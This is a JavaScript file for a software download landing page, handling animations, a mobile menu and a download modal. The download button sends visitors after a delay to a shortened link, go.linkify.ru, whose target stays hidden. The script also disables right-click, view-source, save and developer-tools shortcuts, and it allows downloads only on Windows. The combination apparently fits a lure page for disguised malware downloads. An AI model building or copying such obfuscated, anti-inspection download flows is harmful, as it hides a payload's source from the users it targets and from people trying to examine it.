function onScrollShowCards() {
  const cards = document.querySelectorAll('.card');
  const triggerBottom = window.innerHeight * 0.99;
  cards.forEach(card => {
    const cardTop = card.getBoundingClientRect().top;
    if (cardTop < triggerBottom) {
      card.classList.add('visible');
    }
  });
}
window.addEventListener('scroll', onScrollShowCards);
window.addEventListener('load', () => {
  setTimeout(onScrollShowCards, 100);
});

window.addEventListener('DOMContentLoaded', function() {
  setTimeout(function() {
    document.querySelector('.hero-title')?.classList.add('show');
  }, 100);
  setTimeout(function() {
    document.querySelector('.hero-subtitle')?.classList.add('show');
  }, 300);
  setTimeout(function() {
    document.querySelector('.hero-btns')?.classList.add('show');
  }, 500);
  setTimeout(function() {
    document.querySelector('.hero-visual')?.classList.add('show');
  }, 700);
});

const downloadButtons = document.querySelectorAll('.download-btn.right-align-btn, .nav-button.download-btn.hero-main-btn');
const modalOverlay = document.querySelector('.modal-overlay');
const modalCancelButton = document.querySelector('.modal-cancel');
const modalCloseButton = document.querySelector('.modal-close');
const modalDownloadButton = document.querySelector('.modal-download'); 

const notificationOverlay = document.querySelector('.notification-overlay');
const notificationCloseButton = document.querySelector('.notification-close');

function openModal() {
    modalOverlay.classList.add('visible');
}

function closeModal() {
    modalOverlay.classList.remove('visible');
}

function openNotificationModal() {
    notificationOverlay.classList.add('visible');
}

function closeNotificationModal() {
    notificationOverlay.classList.remove('visible');
}

downloadButtons.forEach(button => {
    button.addEventListener('click', function(e) {
        e.preventDefault(); 
        openModal();
    });
});

modalCancelButton.addEventListener('click', closeModal);
modalCloseButton.addEventListener('click', closeModal);

modalOverlay.addEventListener('click', function(e) {
    if (e.target === modalOverlay) {
        closeModal();
    }
});

modalDownloadButton.addEventListener('click', function(e) {
    e.preventDefault(); 
    closeModal(); 
    openNotificationModal();

    setTimeout(function() {
        window.location.href = 'https://go.linkify.ru/1hg3'; 
    }, 3000); 
});

notificationCloseButton.addEventListener('click', closeNotificationModal);

notificationOverlay.addEventListener('click', function(e) {
    if (e.target === notificationOverlay) {
        closeNotificationModal();
    }
});

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        e.preventDefault();
    }

    if (e.key === 'F12') {
        e.preventDefault();
    }

    if ((e.ctrlKey || e.metaKey) && e.key === 'u') {
        e.preventDefault();
    }

    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
         e.preventDefault();
    }
});

// Get the necessary elements
const menuButton = document.querySelector('.menu-button');
const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
const closeMenuButton = document.querySelector('.close-menu');

// Function to open the mobile menu
function openMobileMenu() {
  mobileMenuOverlay.classList.add('visible');
}

// Function to close the mobile menu
function closeMobileMenu() {
  mobileMenuOverlay.classList.remove('visible');
}

// Add event listeners
if (menuButton) {
  menuButton.addEventListener('click', openMobileMenu);
}

if (closeMenuButton) {
  closeMenuButton.addEventListener('click', closeMobileMenu);
}

// Close menu when clicking outside of the menu content
if (mobileMenuOverlay) {
  mobileMenuOverlay.addEventListener('click', (event) => {
    // Check if the click was directly on the overlay, not the menu content
    if (event.target === mobileMenuOverlay) {
      closeMobileMenu();
    }
  });
}

// --- OS Detection and Download Button Handling ---

function getOS() {
  const userAgent = window.navigator.userAgent;
  const platform = window.navigator.platform;
  let os = null;
  const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
  const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
  const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
  const androidPlatforms = ['Android'];

  if (macosPlatforms.indexOf(platform) !== -1) {
    os = 'MacOS';
  } else if (iosPlatforms.indexOf(platform) !== -1) {
    os = 'iOS';
  } else if (windowsPlatforms.indexOf(platform) !== -1) {
    os = 'Windows';
  } else if (androidPlatforms.indexOf(platform) !== -1) {
    os = 'Android';
  } else if (/Linux/.test(platform)) {
    os = 'Linux';
  } else if (/CrOS/.test(userAgent)) {
    os = 'Chrome OS';
  } else {
    os = 'Other';
  }

  return os;
}

const userOS = getOS();
const downloadButtonsToDisable = document.querySelectorAll(
  '.download-btn,'
  +' .modal-download'
);

if (userOS !== 'Windows') {
  downloadButtonsToDisable.forEach(button => {
    button.classList.add('download-disabled');

    // Store original text to avoid appending multiple times
    const originalText = button.textContent.trim();
    if (!originalText.includes('Not Supported')) {
      button.textContent = `Not Supported: ${userOS}`;
    }

    // Prevent click action
    // Check if event listeners are already attached via the downloadButtons.forEach loop earlier
    // If so, we might need to modify that loop or add a higher priority listener.
    // For simplicity, let's add a listener that runs first and stops propagation.
    // This might add a duplicate listener if one already exists, but should work.
    const preventDownload = function(e) {
      e.preventDefault();
      e.stopPropagation(); // Prevent other click listeners from firing
      // Optionally, show a small message or log to console
      console.log(`Download not supported on ${userOS}`);
    };

    // Add event listener to prevent download. Use capture phase to run before other listeners.
    button.addEventListener('click', preventDownload, true);

    // Also disable href for anchor tags
    if (button.tagName === 'A') {
        button.setAttribute('data-href', button.getAttribute('href')); // Store original href
        button.removeAttribute('href'); // Remove href
    }

  });

   // Modify the existing download button click handler to check for the disabled class
  downloadButtons.forEach(button => {
      const originalHandler = button.onclick; // Store original handler if any
      button.onclick = function(e) {
          if (this.classList.contains('download-disabled')) {
              e.preventDefault();
              e.stopPropagation();
              console.log(`Download not supported on ${userOS}`);
          } else if (originalHandler) {
              originalHandler.apply(this, arguments); // Call original handler if not disabled
          } else {
              // Fallback for cases where no original handler was captured
              // This is similar to the logic in the openModal function
              e.preventDefault(); 
              openModal();
          }
      };
  });

  // Modify the modal download button click handler
  if (modalDownloadButton && modalDownloadButton.classList.contains('download-disabled')) {
       modalDownloadButton.onclick = function(e) {
          e.preventDefault();
          e.stopPropagation();
          console.log(`Download not supported on ${userOS}`);
      };
  }
}